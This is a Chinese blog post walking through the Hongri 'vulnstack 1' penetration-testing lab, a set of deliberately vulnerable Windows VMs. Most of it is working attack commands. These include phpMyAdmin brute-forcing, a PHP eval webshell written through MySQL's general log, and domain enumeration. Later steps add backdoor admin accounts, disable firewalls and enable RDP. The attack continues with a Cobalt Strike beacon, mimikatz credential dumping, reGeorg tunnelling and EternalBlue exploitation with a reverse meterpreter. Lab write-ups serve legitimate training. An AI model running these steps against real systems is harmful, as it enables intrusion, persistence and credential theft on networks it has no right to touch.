<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>红日安全 vulnstack (一) - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="红日安全 vulnstack (一)" />
<meta property="og:description" content="仅供安全研究，切勿违法犯罪。
大家好，这段时间在玩红日安全的靶场，这个靶场质量非常高，推荐大家玩一玩
红日安全网站http://vulnstack.qiyuanxuetang.net/ 这里我们打的靶场系列一
这边找到靶机
进去下载靶机
靶机登录密码一律为：hongrisec@2019
我这边下载下来一共是三个靶机 分别是win2003 win7（有phpstudy，内含web环境） win2008
这是靶机网络环境的拓步图
那么win7是通外网的，win2003和win2008是不通外网，但是与win7是互通的
那么我们简单配置一下网络（每块网卡位置要对应上，实践经验，） 如果先是nat在仅主机
那么它本身配的域控ipv4 全跑nat网了 它配的域控ipv4应该要在仅主机的那块网卡上 所以仅主机网卡要放在第一位
win7
win2003
win2008
我登录win2003 2008的时候还提示密码过期要修改
我改成了hongrisec@2020
仅主机模式网段是192.168.25.*
win7nat网ip是192.168.88.128
第一步我们信息整理一下 一方面是开放端口 一方面是目录扫描
密码爆破起来 msf（有时候它会误报，我们用它误报的去登录一下，跳转了，所以误报，把这个误报密码从字典拿出来即可）
search type:auxiliary login search type:auxiliary name:phpmyadmin login use 0 options set rhosts 192.168.88.128 set pass_file /home/yan8925298/1.txt set targeturi /phpMyAdmin/index.php set threads 2 run 然后我们总结一下phpadmingetshell的方法
1 直接把shell写进去 2 利用全局日志写shell 3 慢日志文件写 shell 4 使用错误日志getshell 5利用phpmyadmin4.8.x本地文件包含漏洞getsh 通过phpinfo 知道C:/phpStudy/WWW/phpinfo.php这是网站根目录
使用直接写shell" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/0182d73d7c8aba7fa5626ffd3e5da6d8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-04T16:18:19+08:00" />
<meta property="article:modified_time" content="2023-12-04T16:18:19+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">红日安全 vulnstack (一)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>仅供安全研究，切勿违法犯罪。</p> 
<p></p> 
<p>大家好，这段时间在玩红日安全的靶场，这个靶场质量非常高，推荐大家玩一玩</p> 
<p><a class="has-card" href="http://vulnstack.qiyuanxuetang.net/" rel="nofollow" title="红日安全网站"><span class="link-card-box"><span class="link-title">红日安全网站</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/75/97/Ah38T6gI_o.png" alt="icon-default.png?t=N7T8">http://vulnstack.qiyuanxuetang.net/</span></span></a> 这里我们打的靶场系列一</p> 
<p>  这边找到靶机</p> 
<p><img alt="" height="929" src="https://images2.imgbox.com/61/e7/12kJvrsr_o.png" width="1200"></p> 
<p>进去下载靶机</p> 
<p>靶机登录密码一律为：hongrisec@2019</p> 
<p><img alt="" height="687" src="https://images2.imgbox.com/90/2d/xHlL4FUV_o.png" width="1134"></p> 
<p>我这边下载下来一共是三个靶机 分别是win2003 win7（有phpstudy，内含web环境） win2008</p> 
<p><img alt="" height="428" src="https://images2.imgbox.com/3e/1e/Ws8Ubd37_o.png" width="857"></p> 
<p>这是靶机网络环境的拓步图</p> 
<p>  那么win7是通外网的，win2003和win2008是不通外网，但是与win7是互通的</p> 
<p>那么我们简单配置一下网络（每块网卡位置要对应上，实践经验，） 如果先是nat在仅主机</p> 
<p>那么它本身配的域控ipv4 全跑nat网了  它配的域控ipv4应该要在仅主机的那块网卡上 所以仅主机网卡要放在第一位</p> 
<p>win7</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/5d/0a/VOMzx1qd_o.png" width="1200"></p> 
<p>win2003</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/9b/e3/SUyYe5g2_o.png" width="1200"></p> 
<p>win2008</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/97/6f/CM5mrTxV_o.png" width="1200"></p> 
<p>我登录win2003 2008的时候还提示密码过期要修改</p> 
<p>我改成了hongrisec@2020</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/92/f2/z5Yp1AwA_o.png" width="1200"></p> 
<p>仅主机模式网段是192.168.25.*</p> 
<p>win7nat网ip是192.168.88.128</p> 
<p>第一步我们信息整理一下  一方面是开放端口 一方面是目录扫描</p> 
<p><img alt="" height="740" src="https://images2.imgbox.com/22/23/yQNGce0d_o.png" width="1150"></p> 
<p><img alt="" height="611" src="https://images2.imgbox.com/66/5b/rBzFDQYU_o.png" width="1200"></p> 
<p><img alt="" height="1006" src="https://images2.imgbox.com/36/69/BfBCrnG9_o.png" width="1200"></p> 
<p>密码爆破起来  msf（有时候它会误报，我们用它误报的去登录一下，跳转了，所以误报，把这个误报密码从字典拿出来即可）</p> 
<pre><code>search type:auxiliary login
search type:auxiliary name:phpmyadmin login
use 0
options
set rhosts 192.168.88.128
set pass_file /home/yan8925298/1.txt
set targeturi /phpMyAdmin/index.php
set threads 2
run</code></pre> 
<p><img alt="" height="112" src="https://images2.imgbox.com/4b/1e/Eip13QzZ_o.png" width="447"></p> 
<p><img alt="" height="900" src="https://images2.imgbox.com/d4/c4/AoR4xFyL_o.png" width="1200"></p> 
<p>然后我们总结一下phpadmingetshell的方法</p> 
<pre><code>1 直接把shell写进去
2 利用全局日志写shell
3 慢日志文件写 shell
4 使用错误日志getshell
5利用phpmyadmin4.8.x本地文件包含漏洞getsh</code></pre> 
<p><img alt="" height="1010" src="https://images2.imgbox.com/9a/2b/HIC1oLRq_o.png" width="1200"></p> 
<p>通过phpinfo 知道C:/phpStudy/WWW/phpinfo.php这是网站根目录</p> 
<p>使用直接写shell</p> 
<p><img alt="" height="929" src="https://images2.imgbox.com/d7/7d/FqMZVzTh_o.png" width="1200">使用这个下面这个命令查看下secure_file_priv</p> 
<pre><code> show variables like '%secure%';</code></pre> 
<p><img alt="" height="929" src="https://images2.imgbox.com/97/3c/qW2bNZgi_o.png" width="1200"></p> 
<p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出                                                                      </p> 
<p>那我们使用全局日志写shell</p> 
<pre><code>--SHOW VARIABLES LIKE '%general%';   查看配置，默认是关闭状态

--set global general_log = on;       开启general_log模式

--set global general_log_file='C:/phpStudy/WWW/shell.php';   修改日志目录为shell地址 

--select "&lt;?php @eval($_POST['123']);?&gt;"        写入shell因为开启了日志记录功能，所执行的sql语句都会被记录在日志中</code></pre> 
<p><img alt="" height="951" src="https://images2.imgbox.com/23/56/Adliz1iy_o.png" width="1200"> 依次执行命令 成了</p> 
<p><img alt="" height="699" src="https://images2.imgbox.com/b0/92/5Fq7WM3D_o.png" width="1040"></p> 
<p><img alt="" height="699" src="https://images2.imgbox.com/cd/c0/eNnDQxmt_o.png" width="1040"></p> 
<p>根目录下还有个web网站，dirsearch没扫出来</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/96/33/8Je0Ak7x_o.png" width="1200"></p> 
<p>这边信息泄露完了啊</p> 
<p><img alt="" height="929" src="https://images2.imgbox.com/f9/61/m1xBaMUF_o.png" width="1200"></p> 
<p>有个模板内容编辑</p> 
<p>随便找个php文件添加一句话木马吧   放到第一句 有些文章加到第二句，连接不上</p> 
<p>&lt;?php eval($_POST[cmd]); ?&gt;</p> 
<p></p> 
<p>这边用工具跑出来一个目录列表 </p> 
<p><img alt="" height="519" src="https://images2.imgbox.com/74/e5/DimSoyIL_o.png" width="993"></p> 
<p>访问了这几个文件夹没收获</p> 
<p><img alt="" height="980" src="https://images2.imgbox.com/04/4e/w4XOVlaC_o.png" width="1200"></p> 
<p>访问一下这个robots文件，根据索引访问一下。 </p> 
<p><img alt="" height="945" src="https://images2.imgbox.com/89/e5/kqR1Vgla_o.png" width="1200"></p> 
<p></p> 
<p>这不就找到了</p> 
<p><img alt="" height="699" src="https://images2.imgbox.com/6b/7a/6Ra8TSgz_o.png" width="1040"></p> 
<p>这个新增模板也能getshell</p> 
<p><img alt="" height="1000" src="https://images2.imgbox.com/49/ea/oCqMgWUN_o.png" width="1200"></p> 
<p> 下一步进攻内网</p> 
<p>这个网站漏洞 下篇文章用代码审计 审审</p> 
<p>先通关吧</p> 
<p><img alt="" height="699" src="https://images2.imgbox.com/ef/bd/p56osO7F_o.png" width="1040"></p> 
<p>初步收集</p> 
<pre><code> ipconfig /all   # 查看本机ip，所在域</code><code> route print     # 打印路由信息</code><code> net view        # 查看局域网内其他主机名</code><code> arp -a          # 查看arp缓存</code><code> net start       # 查看开启了哪些服务</code><code> net share       # 查看开启了哪些共享</code><code> net share ipc$  # 开启ipc共享</code><code> net share c$    # 开启c盘共享</code><code> net use \\192.168.xx.xx\ipc$ "" /user:""    # 与192.168.xx.xx建立空连接</code><code> net use \\192.168.xx.xx\c$ "密码" /user:"用户名"    # 建立c盘共享</code><code> dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件</code><code> </code><code> net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</code><code> net user                 # 查看本机用户列表</code><code> net user /domain         # 查看域用户</code><code> net localgroup administrators    # 查看本地管理员组（通常会有域用户）</code><code> net view /domain         # 查看有几个域</code><code> net user 用户名 /domain   # 获取指定域用户的信息</code><code> net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</code><code> net group 组名 /domain    # 查看域中某工作组</code><code> net group "domain admins" /domain  # 查看域管理员的名字 net group "domain computers" /domain 
 # 查看域中的其他主机名 net group "doamin controllers" /domain  # 查看域控制器（可能有多台）</code></pre> 
<p><img alt="" height="237" src="https://images2.imgbox.com/a6/4e/S3cqCwp6_o.png" width="815"></p> 
<p>遇到这个问题 建议大家去控制面板 管理用户看看 域控制器里面有此用户（Administrator）吗</p> 
<p><img alt="" height="918" src="https://images2.imgbox.com/27/69/eHO1ABhX_o.png" width="1200"></p> 
<p>我是自己建了一个用户 然后删除 相当于刷新了一下用户面板 使这个liukaifeng01生效</p> 
<p><img alt="" height="640" src="https://images2.imgbox.com/ba/00/sYTidA2O_o.png" width="1024"></p> 
<pre><code>whoami
net user /domain
net group "domain admins" /domain
route print</code></pre> 
<p><img alt="" height="640" src="https://images2.imgbox.com/82/4d/vepA953x_o.png" width="1024">该域名为god.org，域控为<code>OWA$</code>，域管理员为<code>Administrator</code>，内网网段为192.168.52.1/24，我们用Ping命令探测域控的ip</p> 
<p>ping owa.god.org</p> 
<p><img alt="" height="211" src="https://images2.imgbox.com/2d/78/aSx3OkUN_o.png" width="714"></p> 
<p>输入netstat -ano | find "3389" 查看远程桌面是否没开 没开我们用下面命令</p> 
<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p> 
<p><img alt="" height="148" src="https://images2.imgbox.com/b1/12/FBuKPOqk_o.png" width="991"></p> 
<p>我们接下来创建一个admin用户</p> 
<pre>net user admin Gz123456 /add</pre> 
<p>并将admin用户添加至管理员组</p> 
<pre>net localgroup Administrators admin /add</pre> 
<p><img alt="" height="119" src="https://images2.imgbox.com/13/48/MZQTXomY_o.png" width="476"></p> 
<p>输入命令mstsc 远程连接这台主机</p> 
<p>远程连接失败 我们去用nmap扫一下3389服务状态</p> 
<p>nmap -p 3389 192.168.192.197 </p> 
<p><img alt="" height="216" src="https://images2.imgbox.com/dd/10/9q2ZE5mr_o.png" width="592"></p> 
<p>现状态为filtered，应该是被防火墙给过滤了</p> 
<pre><code>关闭防火墙：netsh firewall set opmode mode=disable
关闭防火墙： netsh advfirewall set allprofiles state off
查看防火墙状态： netsh advfirewall show allprofiles
防火墙恢复默认配置：netsh firewall reset</code></pre> 
<p><img alt="" height="640" src="https://images2.imgbox.com/7f/8d/8RyeIkb5_o.png" width="1024"><img alt="" height="600" src="https://images2.imgbox.com/a9/0a/Y14FKzAS_o.png" width="800"></p> 
<p>成功连接了</p> 
<p>我们这边整理一下，因为这是我们自己搭建的，所以我们物理机肯定和nat网是通的，但是真实情况是win7nat网是外网，所以不能直接用内网cs做服务器，要用公网做服务器，因为内网cs做服务器，外网是ping不通的内网的。</p> 
<p>我们把公网服务器生成的木马用蚁剑拖到文件管理器里面</p> 
<p>然后cd到becon.exe目录</p> 
<pre>start becon.exe</pre> 
<p><img alt="" height="640" src="https://images2.imgbox.com/b2/97/Bmf51s5M_o.png" width="1024"></p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/2b/f0/i4iby4NW_o.png" width="1200"></p> 
<p>我们这边用插件的mimitakz</p> 
<p><img alt="" height="457" src="https://images2.imgbox.com/50/a2/mrEdHcX4_o.png" width="870"></p> 
<p>找出域控管理员明文密码了hongrisec@2020</p> 
<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr "TTL="</p> 
<p>远程桌面 使用管理员权限打开命令行界面 执行Ping命令探测内网主机</p> 
<p><img alt="" height="551" src="https://images2.imgbox.com/b2/30/eMFx1q2R_o.png" width="858"></p> 
<p>三台主机存活</p> 
<p>我们现在的问题是没有办法直连这三台主机，因为这三台主机不出网，所以我们需要利用中转服务器做一个sock5代理。</p> 
<p>这里直接用reGeorg+proxychains组合</p> 
<pre><code>reGeorg:

python3 neoreg.py generate -k tenet （在neoreg_servers文件夹下生成各种类型代理脚本 -k指定连接密码）
将脚本放到中转服务器的目录下，前提是要可以访问到
python3 neoreg.py -k tenet -u http://192.168.192.197/tunnel.php

proxychains（proxychains4不支持icmp协议，所以不支持ping命令）:

vim /etc/proxychains.conf（注释最后一行的scos4代理 添加socks5 127.0.0.1:1080） 
proxychains msfconsole -n （-n，这样就不会显示日志输出。代理msf）</code></pre> 
<p>我们这里使用永恒之蓝的检测和利用模块 </p> 
<pre><code>use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 目标ip
run
加载payload
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue （支持打64位系统，不支持32位。这个payload不行就换下一个）
set payload windows/x64/meterpreter/reverse_tcp
set rhosts 目标机
set LHOST 攻击机
show options 检查配置
exploit或者run 攻击</code></pre> 
<p><img alt="" height="851" src="https://images2.imgbox.com/68/e7/AkFbCizk_o.png" width="1200">这三台都存在永恒之蓝漏洞</p> 
<p>基本差不多了</p> 
<p>我们获得域控主机管理员账户密码了  还要永恒之蓝漏洞</p> 
<p>我打了一下 就能打个win7 143那台机子</p> 
<p>2003 和2008我用command模块</p> 
<pre><code>use auxiliary/admin/smb/ms17_010_command

set COMMAND net user

set RHOST 192.168.52.141

run
</code></pre> 
<p><img alt="" height="851" src="https://images2.imgbox.com/a6/06/NbhZUoOH_o.png" width="1200"></p> 
<pre><code>set command net user sss qwer@1234 /add #添加用户
run # 发现用户添加不成功，后来发现是因为有密码设置策略，密码不能太简单。

set command net localgroup administrators sss /add #管理员权限
run 

set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' 
#开启3389端口
run

set command netsh advfirewall set allprofiles state off #关闭防火墙
run 
</code></pre> 
<p>后面就不需要我多说了吧 开启3389端口 用win7连接域控管理员账户密码，拿下域控主机2008</p> 
<p>结尾在给大家拓步一下知识 如何上线cs 不出网域控主机 </p> 
<p><img alt="" height="322" src="https://images2.imgbox.com/b2/a9/hz9sYJCc_o.png" width="616"></p> 
<p>这是我画的拓补图，首先我们的公网是可以上线192.197的 因为192.197通外网</p> 
<p>我们先上线192.197</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/74/91/7TWFyeqa_o.png" width="1200"></p> 
<p>右键代理转发（需要用到哪个ip就在哪个ip转发）  选择转发上线（图片中的ip和我们的拓补图可能对不上 不用在意细节，注重网段即可）</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/25/bc/KmKddcq8_o.png" width="1200"></p> 
<p>监听地址选择同网段的ip 会话选择这个上线的shell（ 你右键代理转发选的哪个监听器，这里就用那个会话）</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/81/67/koLwzeR3_o.png" width="1200"></p> 
<p>然后选择监听器，生成木马</p> 
<p><img alt="" height="1040" src="https://images2.imgbox.com/50/e0/uS9cGQBB_o.png" width="1200">成功上线</p> 
<p></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/dc677f48f423cb7d651a009db94e9a28/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">HbuilderX下载插件失败，报插件下载失败，请检查网络是否正常！解决方案</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/c76feee22e4fde54a992684aa54f9b6d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Latex分点介绍</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>